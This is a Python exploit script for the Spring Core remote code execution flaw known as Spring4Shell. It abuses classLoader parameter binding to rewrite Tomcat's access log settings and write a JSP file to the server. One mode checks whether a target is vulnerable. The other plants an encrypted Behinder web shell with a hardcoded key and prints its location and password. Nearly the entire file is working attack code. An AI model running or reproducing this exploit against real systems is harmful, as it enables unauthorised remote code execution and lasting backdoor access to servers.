from ast import arg
import time
from urllib.parse import urlparse
import requests
import random
import argparse
from urllib3.exceptions import InsecureRequestWarning
# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def vuln(url,proxy):
    rand = random.randint(10000, 99999)
    content = '<%out.println("challenge");%>'.replace("%","%{"+sign+"}i")
    data = {"class.module.classLoader.resources.context.parent.pipeline.first.pattern": content+"<!--",
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix": suffix,
            "class.module.classLoader.resources.context.parent.pipeline.first.directory": directory,
            "class.module.classLoader.resources.context.parent.pipeline.first.prefix": prefix,
            "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": rand
            }
    requests.post(url, headers=headers, data=data, allow_redirects=False, verify=False, proxies=proxy)
    print("[*] waiting for 10s...")
    time.sleep(10)
    re2 = requests.get("{}/{}{}.jsp".format(location,prefix,rand), headers=headers, allow_redirects=False, verify=False, proxies=proxy)
    if "challenge" in re2.text:
        print("[+] inject success, vulnerable!")
        print("[+] test at: {}/{}{}.jsp".format(location,prefix,rand))
        print("[*] Response:\n{}".format(re2.text[:200]))
    elif re2.status_code == 200:
        print("[-] Not vulnerable! maybe you can try this URL for more times")
        print("[*] URL: {}/{}{}.jsp".format(location,prefix,rand))
    else:
        print("[-] Not vulnerable! ")



def rebeyond(url, proxy):
    rand = random.randint(10000, 99999)
    content = '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'.replace("%","%{"+sign+"}i")
    data = {"class.module.classLoader.resources.context.parent.pipeline.first.pattern": content+"<!--",
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix": suffix,
            "class.module.classLoader.resources.context.parent.pipeline.first.directory": directory,
            "class.module.classLoader.resources.context.parent.pipeline.first.prefix": prefix,
            "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": rand
            }
    requests.post(url, headers=headers, data=data, allow_redirects=False, verify=False, proxies=proxy)
    print("[+] rebeyond is {}/{}{}.jsp, passwd is rebeyond".format(location,prefix,rand))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Srping Core Rce.')
    parser.add_argument('--url',help='target url,eg: http://127.0.0.1:8082/helloworld/greeting',required=True)
    parser.add_argument('--type',help='1 vuln test 2.Behinder shell',required=True,type=int)
    parser.add_argument('--directory',help='shell directory,eg: webapps/ROOT(Notice: if the path not exists will creat!)',required=False,default="webapps/ROOT")
    parser.add_argument('--filename',help='shell name',required=False,default="inject")
    parser.add_argument('--proxy',help='set request proxy,eg: http://127.0.0.1:8080',required=False, default='None')
    args = parser.parse_args()
    sign = "challenge"
    headers = {sign: "%",
               "Content-Type": "application/x-www-form-urlencoded",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4606.61 Safari/537.36"
    }
    proxy = args.proxy
    proxies = {
        "http":proxy,
        "https":proxy
    }
    suffix = ".jsp"
    prefix = args.filename
    directory = args.directory
    location = urlparse(args.url).scheme + "://" + urlparse(args.url).netloc
    if args.type == 1:
        vuln(args.url, proxies)
    elif args.type == 2:
        rebeyond(args.url, proxies)
